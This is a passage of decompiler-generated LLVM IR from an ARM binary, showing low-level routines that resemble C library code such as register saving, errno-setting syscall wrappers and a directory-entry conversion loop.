  store i32 %v5_11fe8, i32* %r2.global-to-local, align 4
  %v5_11fec = call i32 @function_124e4(i32 %v2_11fd0, i32 %v2_11fe8, i32 %v5_11fe8, i32 1)
  store i32 %v5_11fec, i32* %r0.global-to-local, align 4
  %v0_11ff0 = load i32, i32* @r4, align 4
  %v1_11ff0 = add i32 %v0_11ff0, 28
  store i32 %v1_11ff0, i32* %r3.global-to-local, align 4
  %v1_11ff4 = inttoptr i32 %v1_11ff0 to i32*
  %v2_11ff4 = load i32, i32* %v1_11ff4, align 4
  store i32 %v2_11ff4, i32* %r2.global-to-local, align 4
  %v3_11ff4 = add i32 %v0_11ff0, 24
  %v4_11ff4 = inttoptr i32 %v3_11ff4 to i32*
  %v5_11ff4 = load i32, i32* %v4_11ff4, align 4
  store i32 %v5_11ff4, i32* %r3.global-to-local, align 4
  %v2_11ff8 = sub i32 %v5_11ff4, %v2_11ff4
  store i32 %v2_11ff8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_12000 = inttoptr i32 %v5_11fec to i8*
  %v4_12000 = call i32 @function_bff0(i8* %v3_12000, i32 0, i32 %v2_11ff8)
  store i32 %v4_12000, i32* %r0.global-to-local, align 4
  ret i32 %v4_12000

; uselistorder directives
  uselistorder i32 %v3_11fcc, { 1, 0 }
  uselistorder i32 %v0_11fb8, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 0, 1, 2 }
  uselistorder i32 (i8*, i32, i32)* @function_bff0, { 0, 2, 3, 4, 5, 1, 12, 11, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @function_124e4, { 1, 0 }
  uselistorder i8 1, { 4, 0, 1, 5, 2, 3, 6, 7 }
  uselistorder i32 44, { 2, 36, 37, 3, 13, 14, 0, 15, 4, 16, 5, 6, 7, 20, 21, 22, 23, 24, 25, 17, 18, 19, 8, 1, 9, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 10, 11, 12 }
  uselistorder i32 40, { 5, 7, 1, 6, 2, 3, 0, 4 }
  uselistorder i32* @ip, { 2, 0, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 4, 1, 5 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1200c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12050:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 11556) to i32*), align 4
  ret i32 0
}

define i32 @function_12064() local_unnamed_addr {
dec_label_pc_12064:
  %stack_var_0 = alloca i32, align 4
  %v0_12064 = load i32, i32* @r0, align 4
  %v1_12068 = inttoptr i32 %v0_12064 to i32*
  %v2_12068 = load i32, i32* @r4, align 4
  store i32 %v2_12068, i32* %v1_12068, align 4
  %v3_12068 = add i32 %v0_12064, 4
  %v4_12068 = inttoptr i32 %v3_12068 to i32*
  %v5_12068 = load i32, i32* @r5, align 4
  store i32 %v5_12068, i32* %v4_12068, align 4
  %v6_12068 = add i32 %v0_12064, 8
  %v7_12068 = inttoptr i32 %v6_12068 to i32*
  %v8_12068 = load i32, i32* @r6, align 4
  store i32 %v8_12068, i32* %v7_12068, align 4
  %v9_12068 = add i32 %v0_12064, 12
  %v10_12068 = inttoptr i32 %v9_12068 to i32*
  %v11_12068 = load i32, i32* @r7, align 4
  store i32 %v11_12068, i32* %v10_12068, align 4
  %v12_12068 = add i32 %v0_12064, 16
  %v13_12068 = inttoptr i32 %v12_12068 to i32*
  %v14_12068 = load i32, i32* @r8, align 4
  store i32 %v14_12068, i32* %v13_12068, align 4
  %v15_12068 = add i32 %v0_12064, 20
  %v16_12068 = inttoptr i32 %v15_12068 to i32*
  %v17_12068 = load i32, i32* @sb, align 4
  store i32 %v17_12068, i32* %v16_12068, align 4
  %v18_12068 = add i32 %v0_12064, 24
  %v19_12068 = inttoptr i32 %v18_12068 to i32*
  %v20_12068 = load i32, i32* @sl, align 4
  store i32 %v20_12068, i32* %v19_12068, align 4
  %v21_12068 = add i32 %v0_12064, 28
  %v22_12068 = inttoptr i32 %v21_12068 to i32*
  %v23_12068 = load i32, i32* @fp, align 4
  store i32 %v23_12068, i32* %v22_12068, align 4
  %v24_12068 = add i32 %v0_12064, 32
  %v25_12068 = inttoptr i32 %v24_12068 to i32*
  %v27_12068 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_12068, i32* %v25_12068, align 4
  %v28_12068 = add i32 %v0_12064, 36
  %v29_12068 = inttoptr i32 %v28_12068 to i32*
  %v30_12068 = load i32, i32* @lr, align 4
  store i32 %v30_12068, i32* %v29_12068, align 4
  %v0_1206c = call i32 @function_12508()
  ret i32 %v0_1206c

; uselistorder directives
  uselistorder i32 %v0_12064, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 36, { 13, 5, 6, 0, 1, 4, 11, 12, 7, 10, 8, 2, 3, 9 }
  uselistorder i32 32, { 59, 60, 28, 38, 61, 26, 46, 47, 31, 32, 29, 48, 49, 50, 39, 40, 51, 54, 55, 41, 42, 43, 44, 45, 62, 33, 56, 0, 1, 3, 2, 57, 5, 4, 7, 6, 9, 8, 30, 34, 27, 58, 10, 11, 13, 12, 35, 52, 15, 14, 17, 16, 19, 18, 21, 20, 23, 22, 25, 24, 36, 53, 37 }
  uselistorder i32* @fp, { 49, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 20, 21, 22, 38, 40, 39, 41, 18, 23, 24, 25, 1, 19, 30, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 37, 42, 43, 45, 0, 44, 46, 47, 48 }
  uselistorder i32* @sl, { 91, 92, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 63, 0, 64, 65, 4, 22, 23, 18, 19, 93, 66, 67, 68, 1, 69, 70, 71, 72, 73, 74, 76, 2, 75, 78, 77, 79, 80, 81, 82, 24, 25, 20, 26, 27, 28, 29, 34, 35, 36, 37, 30, 31, 32, 33, 21, 38, 39, 40, 41, 42, 43, 56, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 58, 59, 60, 61, 62, 83, 84, 85, 86, 89, 87, 88, 3, 90 }
  uselistorder i32 24, { 30, 3, 4, 31, 12, 13, 0, 14, 15, 16, 17, 18, 19, 9, 20, 5, 21, 22, 24, 25, 10, 11, 2, 6, 23, 26, 1, 27, 28, 29, 7, 8 }
  uselistorder i32* @sb, { 40, 41, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 30, 33, 31, 32, 34, 17, 18, 19, 20, 21, 13, 14, 22, 26, 23, 24, 25, 27, 28, 29, 35, 36, 0, 37, 38, 39 }
}

define i32 @function_12070() local_unnamed_addr {
dec_label_pc_12070:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12070 = load i32, i32* @r1, align 4
  %v9_12070 = load i32, i32* @r3, align 4
  store i32 %v9_12070, i32* %stack_var_-4, align 4
  %v3_12074 = load i32, i32* @r4, align 4
  store i32 %v3_12074, i32* %stack_var_-32, align 4
  %v12_12074 = load i32, i32* @r7, align 4
  %v4_12084 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_1208c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1208c, i32* @r3, align 4
  %v2_12090 = icmp eq i32 %v4_12084, 0
  %v0_12098 = load i32, i32* @r0, align 4
  store i32 %v0_12098, i32* @r4, align 4
  store i32 %v3_12070, i32* @r5, align 4
  br i1 %v2_12090, label %dec_label_pc_120a8, label %dec_label_pc_120e0

dec_label_pc_120a8:                               ; preds = %dec_label_pc_12070
  %tmp = icmp ult i32 %v0_12098, -4095
  br i1 %tmp, label %dec_label_pc_120d8, label %dec_label_pc_120c0

dec_label_pc_120c0:                               ; preds = %dec_label_pc_120a8
  %v1_120c4 = sub i32 0, %v0_12098
  %v3_120c8 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_120c8 = sext i16 %v3_120c8 to i32
  store i32 %v4_120c8, i32* @r3, align 4
  %v0_120cc = call i32 @function_f150()
  %v2_120d0 = load i32, i32* @r3, align 4
  %v3_120d0 = add i32 %v2_120d0, %v0_120cc
  %v4_120d0 = inttoptr i32 %v3_120d0 to i32*
  store i32 %v1_120c4, i32* %v4_120d0, align 4
  br label %dec_label_pc_120d8

dec_label_pc_120d8:                               ; preds = %dec_label_pc_120a8, %dec_label_pc_120c0
  %v0_120d8 = phi i32 [ %v0_12098, %dec_label_pc_120a8 ], [ -1, %dec_label_pc_120c0 ]
  br label %dec_label_pc_1212c

dec_label_pc_120e0:                               ; preds = %dec_label_pc_12070
  %v0_120e0 = call i32 @function_e9c8()
  store i32 %v0_120e0, i32* %r6.global-to-local, align 4
  %v0_120f0 = load i32, i32* @r4, align 4
  %tmp15 = icmp ult i32 %v0_120f0, -4095
  br i1 %tmp15, label %dec_label_pc_12120, label %dec_label_pc_12108

dec_label_pc_12108:                               ; preds = %dec_label_pc_120e0
  %v1_1210c = sub i32 0, %v0_120f0
  %v3_12110 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_12110 = sext i16 %v3_12110 to i32
  store i32 %v4_12110, i32* @r3, align 4
  %v0_12114 = call i32 @function_f150()
  %v2_12118 = load i32, i32* @r3, align 4
  %v3_12118 = add i32 %v2_12118, %v0_12114
  %v4_12118 = inttoptr i32 %v3_12118 to i32*
  store i32 %v1_1210c, i32* %v4_12118, align 4
  %v0_12120.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12120

dec_label_pc_12120:                               ; preds = %dec_label_pc_120e0, %dec_label_pc_12108
  %v0_12124 = phi i32 [ %v0_120f0, %dec_label_pc_120e0 ], [ -1, %dec_label_pc_12108 ]
  %v0_12120 = phi i32 [ %v0_120e0, %dec_label_pc_120e0 ], [ %v0_12120.pre, %dec_label_pc_12108 ]
  store i32 %v0_12124, i32* @r7, align 4
  %v1_12128 = call i32 @function_e940(i32 %v0_12120)
  %v0_1212c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1212c

dec_label_pc_1212c:                               ; preds = %dec_label_pc_120d8, %dec_label_pc_12120
  %v0_1212c = phi i32 [ %v0_120d8, %dec_label_pc_120d8 ], [ %v0_1212c.pre, %dec_label_pc_12120 ]
  %v2_12134 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12134, i32* @r4, align 4
  store i32 %v12_12074, i32* @r7, align 4
  ret i32 %v0_1212c

; uselistorder directives
  uselistorder i32 %v0_120f0, { 1, 2, 0 }
  uselistorder i32 %v0_12098, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @function_e940, { 12, 4, 3, 11, 1, 2, 10, 9, 8, 5, 7, 6, 0 }
  uselistorder i32 ()* @function_e9c8, { 12, 4, 3, 11, 1, 2, 10, 9, 8, 5, 7, 6, 0 }
  uselistorder label %dec_label_pc_1212c, { 1, 0 }
  uselistorder label %dec_label_pc_12120, { 1, 0 }
  uselistorder label %dec_label_pc_120d8, { 1, 0 }
}

define i32 @function_12150(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12150:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12150 = load i32, i32* @r4, align 4
  store i32 %v3_12150, i32* %stack_var_-12, align 4
  %v0_12160 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12160, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12160, -4095
  br i1 %tmp, label %dec_label_pc_12188, label %dec_label_pc_12170

dec_label_pc_12170:                               ; preds = %dec_label_pc_12150
  %v0_12174 = call i32 @function_f150()
  %v3_12178 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_12178 = sext i16 %v3_12178 to i32
  %v0_1217c = load i32, i32* %r2.global-to-local, align 4
  %v1_1217c = sub i32 0, %v0_1217c
  store i32 %v1_1217c, i32* %r2.global-to-local, align 4
  %v3_12180 = add i32 %v4_12178, %v0_12174
  %v4_12180 = inttoptr i32 %v3_12180 to i32*
  store i32 %v1_1217c, i32* %v4_12180, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12188.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12188

dec_label_pc_12188:                               ; preds = %dec_label_pc_12150, %dec_label_pc_12170
  %v1_1218c = phi i32 [ %v0_12160, %dec_label_pc_12150 ], [ -1, %dec_label_pc_12170 ]
  %v2_12188 = phi i32 [ %v3_12150, %dec_label_pc_12150 ], [ %v2_12188.pre, %dec_label_pc_12170 ]
  store i32 %v2_12188, i32* @r4, align 4
  ret i32 %v1_1218c

; uselistorder directives
  uselistorder i32 %v0_12160, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12188, { 1, 0 }
}

define i32 @function_12194(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12194:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_12194 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_12194, i32* %ip.global-to-local, align 4
  %v12_12198 = load i32, i32* @r7, align 4
  %v1_1219c = add i32 %arg3, 14
  %v2_121a4 = ptrtoint i32* %stack_var_-72 to i32
  %v1_121a8 = and i32 %v1_1219c, -8
  %v2_121ac = sub i32 %v2_121a4, %v1_121a8
  %v1_121b0 = add i32 %v2_121ac, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_121f4, label %dec_label_pc_121d8

dec_label_pc_121d8:                               ; preds = %dec_label_pc_12194
  %v1_121dc = sub i32 0, %arg1
  %v3_121e0 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_121e0 = sext i16 %v3_121e0 to i32
  %v0_121e4 = call i32 @function_f150()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_121ec = add i32 %v4_121e0, %v0_121e4
  %v4_121ec = inttoptr i32 %v3_121ec to i32*
  store i32 %v1_121dc, i32* %v4_121ec, align 4
  br label %dec_label_pc_122c4

dec_label_pc_121f4:                               ; preds = %dec_label_pc_12194
  br i1 false, label %dec_label_pc_122c4, label %dec_label_pc_121fc

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121f4
  %v2_121fc = add i32 %v1_121b0, %arg1
  store i32 %v2_121fc, i32* %r1.global-to-local, align 4
  %v2_12200 = add i32 %tmp, %arg3
  store i32 %v2_12200, i32* %ip.global-to-local, align 4
  store i32 %v1_121b0, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_122ac

dec_label_pc_1221c:                               ; preds = %dec_label_pc_122ac
  %v1_1221c = add i32 %v0_1227c, 16
  %v2_1221c = inttoptr i32 %v1_1221c to i16*
  %v3_1221c = load i16, i16* %v2_1221c, align 2
  %v4_1221c = zext i16 %v3_1221c to i32
  %v1_12220 = add nsw i32 %v4_1221c, -19
  store i32 %v1_12220, i32* @r2, align 4
  %v1_12224 = add nuw nsw i32 %v4_1221c, 7
  %v1_12228 = and i32 %v1_12224, 131064
  store i32 %v1_12228, i32* %ip.global-to-local, align 4
  %v2_12230 = add i32 %v1_12228, %v0_12284
  store i32 %v2_12230, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_12230, %v2_12200
  br i1 %tmp24, label %dec_label_pc_1223c, label %dec_label_pc_12278

dec_label_pc_1223c:                               ; preds = %dec_label_pc_1221c
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_12244 = load i32, i32* %r8.global-to-local, align 4
  %v0_12248 = load i32, i32* %sb.global-to-local, align 4
  %v1_1224c = load i32, i32* @sp, align 4
  %v2_1224c = inttoptr i32 %v1_1224c to i32*
  store i32 0, i32* %v2_1224c, align 4
  %v4_12250 = call i32 @function_12548(i32 %arg1, i32 0, i32 %v0_12244, i32 %v0_12248)
  %v0_12254 = load i32, i32* %r5.global-to-local, align 4
  %v1_12254 = load i32, i32* %sl.global-to-local, align 4
  %v9_12254 = icmp eq i32 %v0_12254, %v1_12254
  br i1 %v9_12254, label %dec_label_pc_1225c, label %dec_label_pc_122c0

dec_label_pc_1225c:                               ; preds = %dec_label_pc_1223c
  %v0_12260 = call i32 @function_f150()
  %v3_12264 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_12264 = sext i16 %v3_12264 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12270 = add i32 %v4_12264, %v0_12260
  %v4_12270 = inttoptr i32 %v3_12270 to i32*
  store i32 22, i32* %v4_12270, align 4
  br label %dec_label_pc_122c4

dec_label_pc_12278:                               ; preds = %dec_label_pc_1221c
  %v1_12278 = inttoptr i32 %v0_1227c to i32*
  %v2_12278 = load i32, i32* %v1_12278, align 4
  %v3_12278 = add i32 %v0_1227c, 4
  %v4_12278 = inttoptr i32 %v3_12278 to i32*
  %v5_12278 = load i32, i32* %v4_12278, align 4
  store i32 %v5_12278, i32* @r4, align 4
  %v1_1227c = add i32 %v0_1227c, 8
  store i32 %v1_1227c, i32* %r8.global-to-local, align 4
  %v1_12280 = inttoptr i32 %v1_1227c to i32*
  %v2_12280 = load i32, i32* %v1_12280, align 4
  store i32 %v2_12280, i32* %r8.global-to-local, align 4
  %v3_12280 = add i32 %v0_1227c, 12
  %v4_12280 = inttoptr i32 %v3_12280 to i32*
  %v5_12280 = load i32, i32* %v4_12280, align 4
  store i32 %v5_12280, i32* %sb.global-to-local, align 4
  %v1_12284 = inttoptr i32 %v0_12284 to i32*
  store i32 %v2_12278, i32* %v1_12284, align 4
  %v3_12284 = add i32 %v0_12284, 4
  %v4_12284 = inttoptr i32 %v3_12284 to i32*
  %v5_12284 = load i32, i32* @r4, align 4
  store i32 %v5_12284, i32* %v4_12284, align 4
  %v0_12288 = load i32, i32* %r8.global-to-local, align 4
  %v1_12288 = load i32, i32* %r5.global-to-local, align 4
  %v2_12288 = add i32 %v1_12288, 8
  %v3_12288 = inttoptr i32 %v2_12288 to i32*
  store i32 %v0_12288, i32* %v3_12288, align 4
  %v0_1228c = load i32, i32* %sb.global-to-local, align 4
  %v1_1228c = load i32, i32* %r5.global-to-local, align 4
  %v2_1228c = add i32 %v1_1228c, 12
  %v3_1228c = inttoptr i32 %v2_1228c to i32*
  store i32 %v0_1228c, i32* %v3_1228c, align 4
  %v0_12290 = load i32, i32* %ip.global-to-local, align 4
  %v1_12290 = trunc i32 %v0_12290 to i16
  %v2_12290 = load i32, i32* %r5.global-to-local, align 4
  %v3_12290 = add i32 %v2_12290, 16
  %v4_12290 = inttoptr i32 %v3_12290 to i16*
  store i16 %v1_12290, i16* %v4_12290, align 2
  %v0_12294 = load i32, i32* @r7, align 4
  %v1_12294 = add i32 %v0_12294, 18
  %v2_12294 = inttoptr i32 %v1_12294 to i8*
  %v3_12294 = load i8, i8* %v2_12294, align 1
  %v2_12298 = load i32, i32* %r5.global-to-local, align 4
  %v3_12298 = add i32 %v2_12298, 18
  %v4_12298 = inttoptr i32 %v3_12298 to i8*
  store i8 %v3_12294, i8* %v4_12298, align 1
  %v0_1229c = call i32 @function_bfd0()
  %v0_122a0 = load i32, i32* @r7, align 4
  %v1_122a0 = add i32 %v0_122a0, 16
  %v2_122a0 = inttoptr i32 %v1_122a0 to i16*
  %v3_122a0 = load i16, i16* %v2_122a0, align 2
  %v4_122a0 = zext i16 %v3_122a0 to i32
  %v0_122a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_122a4, i32* %r5.global-to-local, align 4
  %v2_122a8 = add i32 %v4_122a0, %v0_122a0
  store i32 %v2_122a8, i32* @r7, align 4
  br label %dec_label_pc_122ac

dec_label_pc_122ac:                               ; preds = %dec_label_pc_121fc, %dec_label_pc_12278
  %v0_12284 = phi i32 [ %tmp, %dec_label_pc_121fc ], [ %v0_122a4, %dec_label_pc_12278 ]
  %v0_1227c = phi i32 [ %v1_121b0, %dec_label_pc_121fc ], [ %v2_122a8, %dec_label_pc_12278 ]
  %v3_122b0 = icmp ult i32 %v0_1227c, %v2_121fc
  %v1_122b4 = add i32 %v0_12284, 19
  store i32 %v1_122b4, i32* @r0, align 4
  %v1_122b8 = add i32 %v0_1227c, 19
  store i32 %v1_122b8, i32* @r1, align 4
  br i1 %v3_122b0, label %dec_label_pc_1221c, label %dec_label_pc_122c0.loopexit

dec_label_pc_122c0.loopexit:                      ; preds = %dec_label_pc_122ac
  %v0_122c0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_122c0

dec_label_pc_122c0:                               ; preds = %dec_label_pc_122c0.loopexit, %dec_label_pc_1223c
  %v1_122c0 = phi i32 [ %v0_12284, %dec_label_pc_122c0.loopexit ], [ %v0_12254, %dec_label_pc_1223c ]
  %v0_122c0 = phi i32 [ %v0_122c0.pre, %dec_label_pc_122c0.loopexit ], [ %v1_12254, %dec_label_pc_1223c ]
  %v2_122c0 = sub i32 %v1_122c0, %v0_122c0
  store i32 %v2_122c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_122c4

dec_label_pc_122c4:                               ; preds = %dec_label_pc_121f4, %dec_label_pc_1225c, %dec_label_pc_121d8, %dec_label_pc_122c0
  %v0_122c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v12_12198, i32* @r7, align 4
  ret i32 %v0_122c4

; uselistorder directives
  uselistorder i32 %v0_1227c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_12284, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_121b0, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 18, { 3, 4, 5, 0, 1, 6, 2 }
  uselistorder i32 22, { 1, 0, 17, 2, 3, 4, 12, 18, 13, 19, 14, 20, 15, 21, 9, 22, 10, 23, 11, 24, 5, 25, 6, 26, 7, 27, 8, 28, 16 }
  uselistorder i32* @sp, { 3, 10, 11, 12, 13, 4, 5, 6, 7, 0, 8, 1, 9, 2 }
  uselistorder i32 7, { 12, 15, 0, 10, 11, 1, 17, 2, 16, 9, 13, 14, 5, 3, 4, 6, 7, 8 }
  uselistorder i32 -19, { 1, 0, 2, 3, 4 }
  uselistorder i32 -8, { 31, 10, 11, 12, 32, 13, 14, 15, 16, 17, 18, 9, 8, 2, 7, 6, 5, 4, 19, 20, 21, 22, 23, 24, 1, 33, 25, 26, 34, 27, 35, 30, 3, 28, 29, 0 }
  uselistorder i32 14, { 5, 2, 8, 3, 4, 7, 1, 6, 0 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_122c4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_122ac, { 1, 0 }
}

define i32 @function_122dc(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_122dc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_122dc = load i32, i32* @r4, align 4
  store i32 %v3_122dc, i32* %stack_var_-12, align 4
  %v0_122e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_122e0 = inttoptr i32 %v0_122e0 to i16*
  %v2_122e0 = load i16, i16* %v1_122e0, align 2
  %v3_122e0 = zext i16 %v2_122e0 to i32
  store i32 %v3_122e0, i32* @r3, align 4
  %v1_122e4 = and i32 %v3_122e0, 4
  store i32 %v1_122e4, i32* @r5, align 4
  %v2_122e4 = icmp eq i32 %v1_122e4, 0
  store i32 %v0_122e0, i32* @r4, align 4
  br i1 %v2_122e4, label %dec_label_pc_122f8, label %bb

bb:                                               ; preds = %dec_label_pc_122dc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_122f8:                               ; preds = %dec_label_pc_122dc
  %v1_122f8 = icmp slt i32 %arg2, 0
  br i1 %v1_122f8, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_122f8
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_122f8, %bb18
  %v1_12300 = add i32 %v0_122e0, 4
  %v2_12300 = inttoptr i32 %v1_12300 to i32*
  %v3_12300 = load i32, i32* %v2_12300, align 4
  store i32 %v3_12300, i32* %r0.global-to-local, align 4
  %v1_12304 = call i32 @function_e8d0(i32 %v3_12300)
  store i32 %v1_12304, i32* %r0.global-to-local, align 4
  %v5_1230c = icmp sgt i32 %v1_12304, 0
  br i1 %v5_1230c, label %.thread7, label %dec_label_pc_12310

dec_label_pc_12310:                               ; preds = %bb19
  %v2_12308 = icmp eq i32 %v1_12304, 0
  %v0_12310 = load i32, i32* @r4, align 4
  %v1_12310 = inttoptr i32 %v0_12310 to i16*
  %v2_12310 = load i16, i16* %v1_12310, align 2
  br i1 %v2_12308, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_12310
  %v2_12314 = or i16 %v2_12310, 4
  store i16 %v2_12314, i16* %v1_12310, align 2
  %v1_12330.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_12310
  %v2_12318 = or i16 %v2_12310, 8
  store i16 %v2_12318, i16* %v1_12310, align 2
  %v1_12324 = load i32, i32* @r5, align 4
  store i32 %v1_12324, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_12330 = phi i32 [ %v1_12330.pre, %bb20 ], [ 0, %bb ], [ %v1_12304, %bb19 ], [ %v1_12324, %bb21 ]
  %v2_1232c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1232c, i32* @r4, align 4
  ret i32 %v1_12330

; uselistorder directives
  uselistorder i16 %v2_12310, { 1, 0 }
  uselistorder i32 %v1_12304, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_e8d0, { 1, 0 }
  uselistorder i32* @r3, { 18, 19, 20, 21, 22, 23, 24, 75, 76, 77, 78, 79, 80, 0, 16, 17, 25, 26, 27, 28, 29, 30, 31, 59, 60, 81, 99, 100, 101, 89, 90, 91, 92, 93, 2, 94, 5, 42, 43, 87, 88, 82, 83, 84, 85, 86, 56, 57, 44, 45, 46, 32, 33, 34, 105, 102, 103, 104, 3, 106, 107, 108, 35, 95, 96, 97, 98, 72, 73, 74, 1, 61, 62, 63, 6, 54, 53, 11, 52, 7, 47, 48, 49, 50, 4, 15, 51, 64, 12, 65, 8, 66, 36, 37, 38, 39, 40, 41, 55, 14, 58, 9, 70, 67, 68, 69, 71, 13, 10 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_12334(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12334:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_123f82 = icmp eq i32 %arg3, 0
  store i1 %v2_123f82, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123f82, label %dec_label_pc_12400, label %dec_label_pc_12350

dec_label_pc_12350:                               ; preds = %dec_label_pc_12334, %dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge
  %v0_1235c = phi i32 [ %v0_1235c.pre, %dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge ], [ %tmp, %dec_label_pc_12334 ]
  %v0_12358 = phi i32 [ %v5_12368, %dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge ], [ %arg2, %dec_label_pc_12334 ]
  %v3_12350 = phi i32 [ %v3_12350.pre, %dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge ], [ 2147483647, %dec_label_pc_12334 ]
  %v0_12354.in = phi i32 [ %v5_1236c, %dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge ], [ %arg3, %dec_label_pc_12334 ]
